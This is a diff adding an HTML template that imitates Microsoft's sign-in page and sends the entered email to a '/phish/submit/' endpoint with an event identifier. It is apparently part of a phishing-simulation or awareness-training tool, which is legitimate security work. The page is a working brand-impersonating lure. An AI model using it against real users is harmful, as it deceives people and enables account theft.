@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your account</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: "Segoe UI", sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+
+    .ms-card {
+      background: #fff;
+      padding: 44px 44px 36px;
+      width: 440px;
+      border-radius: 2px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.15);
+    }
+    .ms-logo { margin-bottom: 20px; }
+    .ms-logo svg { width: 108px; height: 24px; }
+
+    h1 { font-size: 1.5rem; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
+    .subtitle { font-size: .875rem; color: #1b1b1b; margin-bottom: 24px; }
+    .subtitle a { color: #0067b8; text-decoration: none; }
+    .subtitle a:hover { text-decoration: underline; }
+
+    .form-group { margin-bottom: 16px; }
+    .form-group input {
+      width: 100%; padding: 8px 0;
+      border: none; border-bottom: 1px solid #666;
+      font-size: 1rem; color: #1b1b1b; outline: none;
+      background: transparent;
+    }
+    .form-group input:focus { border-bottom: 2px solid #0067b8; }
+
+    .options { display: flex; align-items: center; justify-content: space-between; margin: 16px 0 24px; }
+    .options label { display: flex; align-items: center; gap: 8px; font-size: .875rem; color: #1b1b1b; cursor: pointer; }
+    .options a { font-size: .875rem; color: #0067b8; text-decoration: none; }
+    .options a:hover { text-decoration: underline; }
+
+    .btn-next {
+      background: #0067b8; color: #fff;
+      border: none; padding: 10px 20px;
+      font-size: .9375rem; cursor: pointer;
+      float: right;
+    }
+    .btn-next:hover { background: #005a9e; }
+
+    .divider { clear: both; border-top: 1px solid #e5e5e5; margin: 24px 0 20px; }
+
+    .sign-options a {
+      display: block; font-size: .875rem; color: #0067b8;
+      text-decoration: none; margin-bottom: 12px;
+    }
+    .sign-options a:hover { text-decoration: underline; }
+
+    .footer { margin-top: 32px; font-size: .75rem; color: #666; display: flex; gap: 16px; flex-wrap: wrap; }
+    .footer a { color: #666; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+<div class="ms-card">
+  <!-- Microsoft logo SVG -->
+  <div class="ms-logo">
+    <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M0 0h11.429v11.429H0z" fill="#F25022"/>
+      <path d="M12.571 0H24v11.429H12.571z" fill="#7FBA00"/>
+      <path d="M0 12.571h11.429V24H0z" fill="#00A4EF"/>
+      <path d="M12.571 12.571H24V24H12.571z" fill="#FFB900"/>
+      <text x="28" y="18" font-family="Segoe UI,sans-serif" font-size="15" fill="#1b1b1b" font-weight="600">Microsoft</text>
+    </svg>
+  </div>
+
+  <h1>Sign in</h1>
+  <p class="subtitle">No account? <a href="#">Create one!</a></p>
+
+  <form method="POST" action="/phish/submit/">
+    {% csrf_token %}
+    <input type="hidden" name="event_id" value="{{ event_id }}">
+
+    <div class="form-group">
+      <input type="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
+    </div>
+
+    <div class="options">
+      <label><input type="checkbox"> Keep me signed in</label>
+      <a href="#">Can't access your account?</a>
+    </div>
+
+    <button type="submit" class="btn-next">Next</button>
+  </form>
+
+  <div class="divider"></div>
+  <div class="sign-options">
+    <a href="#">Sign-in options</a>
+  </div>
+
+  <div class="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy & cookies</a>
+    <a href="#">...</a>
+  </div>
+</div>
+</body>
+</html>
